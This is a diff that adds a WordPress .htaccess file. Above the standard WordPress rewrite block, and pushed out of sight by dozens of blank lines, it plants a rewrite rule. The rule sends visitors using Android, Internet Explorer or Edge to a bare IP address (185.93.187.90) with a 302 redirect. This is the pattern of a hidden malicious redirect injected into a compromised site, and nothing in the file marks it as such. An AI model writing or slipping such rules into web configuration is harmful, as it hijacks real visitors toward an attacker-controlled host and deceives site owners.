@@ -1,0 +1,53 @@
+<IfModule mod_rewrite.c>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteEngine on
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteCond %{HTTP_USER_AGENT} "Android|MSIE|Trident|Edge" [NC]
+
+
+
+
+
+RewriteRule ^(.*)$ http://185.93.187.90/8b2C [L,R=302]
+
+</IfModule>
+
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
